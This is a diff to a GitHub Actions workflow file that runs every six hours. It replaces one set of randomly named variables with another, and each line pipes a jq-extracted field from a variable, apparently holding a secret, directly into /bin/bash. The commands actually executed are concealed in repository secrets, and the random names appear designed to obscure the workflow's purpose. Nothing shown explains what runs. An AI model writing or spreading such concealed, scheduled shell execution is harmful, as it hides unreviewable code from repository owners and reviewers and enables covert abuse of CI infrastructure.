@@ -3,23 +3,32 @@ name: yutingqqq
 on:
   workflow_dispatch:
   schedule:
-    - cron: '17 1/6 * * *'
+    - cron: '22 1/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yutingqqq
         env:
-          wr6618: ${{ secrets.wr6618 }}
+          jluo56728: ${{ secrets.jluo56728 }}
         run: |
-          echo $wr6618 | jq -r .y718 | /bin/bash
-          echo $qp1655 | jq -r .ji6376 | /bin/bash
-          echo $bknwa68639 | jq -r .nzn465 | /bin/bash
-          echo $daz9322 | jq -r .sqcpt42993 | /bin/bash
-          echo $fus0 | jq -r .mwtr53 | /bin/bash
-          echo $wxr5460 | jq -r .f502 | /bin/bash
-          echo $ue2 | jq -r .fjaqj10466 | /bin/bash
-          echo $zhh4 | jq -r .bn49738 | /bin/bash
-          echo $w41676 | jq -r .yx216 | /bin/bash
+          echo $jluo56728 | jq -r .tgkr48695 | /bin/bash
+          echo $f44536 | jq -r .wvpqz38856 | /bin/bash
+          echo $z23340 | jq -r .ibkv59823 | /bin/bash
+          echo $cy2 | jq -r .qk3954 | /bin/bash
+          echo $up0 | jq -r .kn1 | /bin/bash
+          echo $seby89 | jq -r .w2204 | /bin/bash
+          echo $tztd4231 | jq -r .j29501 | /bin/bash
+          echo $od12366 | jq -r .u096 | /bin/bash
+          echo $evse3 | jq -r .xetkc679 | /bin/bash
+          echo $uxxz3430 | jq -r .kmylf57853 | /bin/bash
+          echo $fls0813 | jq -r .bmj5 | /bin/bash
+          echo $n04882 | jq -r .uvhl13828 | /bin/bash
+          echo $c1313 | jq -r .d2 | /bin/bash
+          echo $yen83 | jq -r .w04 | /bin/bash
+          echo $ak41 | jq -r .lfty04 | /bin/bash
+          echo $zat154 | jq -r .l98389 | /bin/bash
+          echo $pcrg259 | jq -r .aluu54947 | /bin/bash
 
